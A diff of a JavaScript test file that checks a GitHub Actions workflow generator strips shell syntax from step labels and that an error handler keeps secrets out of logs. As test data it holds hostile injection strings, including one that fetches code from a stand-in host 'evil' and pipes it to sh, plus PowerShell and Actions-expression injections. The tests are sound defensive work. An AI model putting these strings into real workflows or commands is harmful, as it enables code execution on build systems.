@@ -136,21 +136,54 @@ test('server CI tokens are never paired with a caller-chosen host', () => {
 });
 
 test('default step commands print the label; shell syntax in it is never run', () => {
-  const label = "x $(curl evil|sh) `id` $HOME it's";
+  const generator = new GitHubActionsGenerator();
+  const hostile = [
+    "x $(curl evil|sh) `id` $HOME it's",
+    "test'; Write-Output PWNED; #", // PowerShell on windows-latest
+    '${{ github.event.pull_request.title }}', // expanded by Actions before the shell
+    'a & calc | b > c',
+  ];
+  for (const label of hostile) {
+    const command = generator._echoLabel(label);
+    const inner = command.slice("echo 'Running ".length, -"...'".length);
+    assert.match(command, /^echo 'Running .*\.\.\.'$/, command);
+    assert.doesNotMatch(inner, /[$`'"{};&|<>#\\]/, command);
+  }
+  assert.strictEqual(generator._echoLabel('Build & test: v1.2'), "echo 'Running Build test: v1.2...'");
+  assert.strictEqual(generator._echoLabel('$$$'), "echo 'Running job...'");
+
+  // End to end: the generated workflow carries the safe command.
   const nodes = [
     { id: '1', type: 'trigger_push', data: { label: 'push', config: {} } },
-    { id: '2', type: 'build', data: { label, config: {} } },
+    { id: '2', type: 'build', data: { label: hostile[2], config: {} } },
   ];
   const edges = [{ id: 'e', source: '1', target: '2' }];
-  const doc = require('js-yaml').load(new GitHubActionsGenerator().generate(nodes, edges));
-  const runs = Object.values(doc.jobs).flatMap((job) => job.steps.map((step) => step.run).filter(Boolean));
-  assert.ok(runs.includes("echo 'Running x $(curl evil|sh) `id` $HOME it'\\''s...'"), JSON.stringify(runs));
+  const yamlText = generator.generate(nodes, edges);
+  assert.ok(!yamlText.includes('${{ github.event'), yamlText);
 
   // The emitted command really prints the text (POSIX sh) instead of running it.
   if (process.platform !== 'win32') {
-    const command = new GitHubActionsGenerator()._echoLabel(label);
-    assert.strictEqual(run('sh', ['-c', command]).toString().trim(), `Running ${label}...`);
+    assert.strictEqual(run('sh', ['-c', generator._echoLabel(hostile[0])]).toString().trim(), 'Running x curl evil sh id HOME it s...');
   }
+});
+
+test('malformed JSON bodies are not echoed into logs or responses', async () => {
+  const { errorHandler } = require('../middleware/errorHandler');
+  const err = Object.assign(new SyntaxError('Unexpected token in JSON: {"token":"secret-abc'), {
+    status: 400,
+    type: 'entity.parse.failed',
+  });
+  const logged = [];
+  const originalError = console.error;
+  console.error = (...args) => logged.push(args.join(' '));
+  const res = { headersSent: false, status(c) { this.code = c; return this; }, json(b) { this.body = b; return this; } };
+  try {
+    errorHandler(err, { method: 'POST', originalUrl: '/api/runs' }, res, () => {});
+  } finally {
+    console.error = originalError;
+  }
+  assert.deepStrictEqual(res.body, { error: 'Invalid JSON body' });
+  assert.ok(!logged.join('\n').includes('secret-abc'), logged.join('\n'));
 });
 
 test('generating with an unknown provider is a 400, not a silent template', async () => {
